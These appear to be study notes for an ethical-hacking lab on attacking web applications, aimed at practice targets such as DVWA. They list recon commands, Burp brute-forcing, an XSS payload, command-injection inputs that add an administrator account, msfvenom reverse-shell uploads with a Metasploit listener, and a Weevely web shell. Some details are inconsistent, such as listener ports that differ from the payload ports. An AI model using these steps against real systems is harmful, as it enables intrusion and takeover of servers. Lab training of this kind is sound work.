# Hacking Web Applications

## Footprint the web infrastructure

### Perform web application reconnaissance

Whois lookup to gather information about the IP address of the web server and the complete information about the domain such as its registration details, name servers, IP address, and location.
* Netcraft
* Smartwhois
* Whois Lookup
* IP Convertor

DNS Interrogation to gather information about the DNS servers, DNS records, and types of servers used by the target organization. DNS zone data include DNS domain names, computer names, IP addresses, domain mail servers, service records, etc.
* Toolset
* DNSRecon
* DNS Records
* Domain Doissier

```
nmap -T4 -A -v Website
```
Banner Grabbing
```
telnet website 80
	GET / HTTP/1.1
```

### Perform web application reconnaissance using WhatWeb

```
whatweb -v website
```
export the results returned by WhatWeb as a text file.
```
whatweb --log-verbose=report website
```

### Perform web spidering using OWASP ZAP

Automated Scan -> Type URL -> Attack 

### Detect load balancers using various tools

If a website returns multiple ips for the same domain name, then chances are that it is load balanced
```
dig website
lbd website
```

### Identify web server directories

```
nmap -sV --script http-enum targetip
gobuster dir -u targeturl -w wordlistfilelocation
```

### Perform web application vulnerability scanning using Vega (Windows)

Start new scan -> select scan target -> http://10.10.10.16:8080/dvwa -> Select both modules -> finish -> follow redirect? yes -> 

## Perform web application attacks

### Perform a brute-force attack using Burp Suite

Target - http://10.10.10.16:8080/CEH/wp-login.php?
* Open Burp Suite 
* Configure Proxy
* Go to webpage type in credentials
* inercept the request
* Send to intruder
* Cluster bomb
* select username and password fields
* set payloads for username as well as password
* Start Attack


### Perform parameter tampering using Burp Suite

* Intercept the login request and keep forwarding until you are logged in
* Click View profile
* in parameter observe id=1
* change it to 2


### Exploit parameter tampering and XSS vulnerabilities in web applications

* In contacts page
* enter name and xss payload i.e. <script>alert(1)</script>


### Perform cross-site request forgery (CSRF) attack

* Toget wpscan api token, create an account on https://wpscan.com/register
* Choose a plan
* Edit profile
* There is the token
```
wpscan --api-token [API Token from Step#25] --url website --plugins-detection aggressive --enumerate vp
```

### Enumerate and hack a web application using WPScan and Metasploit
```
wpscan --url url --enumerate u
wpscan --url website --usernames james --passwords file
```
```
wpscan --api-token [API Token] --url website --enumerate u 
```
We will get the username from here. to crack the password we will use metasploit
```
service postgresql start
msfconsole
use auxiliary/scanner/http/wordpress_login_enum
set PASS_FILE password file
set RHOSTS
set RPORT
set TARGETURI
set USERNAME
run
```

### Exploit a remote command execution vulnerability to compromise a target web server (DVWA)

DVWA
Command Injection
* enter IP Address
*  enter ip | hostnamE
*  enter ip | whoami
*  ip | tasklist
*  ip | taskkill /PID PIDVALUEOBTAINED /F
*  ip | dir C:/
*  ip | net user
*  ip | net user Test /Add
*  ip | net localgroup Administrators Test /Add
*  ip | net user Test

open rdp and login to server as test test

### Exploit a file upload vulnerability at different security levels (DVWA)

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP Address of Host Machine] LPORT=4444 -f raw
```
Copy the raw payload from terminal
```
nano upload.php
	paste the payload
```
Go to dvwa -> upload 
* LOW
	* Upload this file
	* Successful
	* Note down the location
```
msfconsole
use /exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost hostip
set lport 4444
run
```
Go to browser and paste the location and press enter
Go to meterpreter
Reverse Shell

* MEDIUM

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP Address of Host Machine] LPORT=3333 -f raw
```
Copy the payload
```
nano upload.php.jpg
	Paste the paylaod
```
Login to dvwa
Before uploading the file turn on burpsuite
upload it
Change filename to upload.php inthe request captured
Send it
Note down the location
```
msfconsole
use /exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost hostip
set lport 4444
run
```
Go to browser and paste the location and press enter
Go to meterpreter
Reverse Shell

* HIGH

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=[IP Address of Host Machine] LPORT=2222 -f raw
```
Copy the payload
```
nano upload.jpeg
	Paste it
```
Login to dvwa
Upload this file
note down the location
Now
in command injection - >
ip |copy C:\wamp64\www\DVWA\hackable\uploads\high.jpeg C:\wamp64\www\DVWA\hackable\uploads\shell.php

```
msfconsole
use /exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost hostip
set lport 4444
run
```
Go to browser and paste the new php location and press enter
Go to meterpreter
Reverse Shell

### Gain backdoor access via a web shell using Weevely

Gaining backdoor access refers to entering a website in a stealthy way. These Backdoors are often installed via some unvalidated uploads. This vulnerability allows you to upload harmful files to the target web server. Websites that are developed using PHP are often susceptible to this kind of attack.

A professional ethical hacker or pen tester can use tools such as Weevely to gain backdoor access to a website without being traced. Weevely is used to develop a backdoor shell and upload it to a target server in order to gain remote shell access. This tool also helps in performing administrative tasks, maintaining persistence, and spreading backdoors across the target network.

```
weevely generate (Password) (File Path)
```
Goto DVWA -> File Upload
Upload the file
note the location
go to terminal
```
weevely location [Password]
```
Boom - Reverse Shell
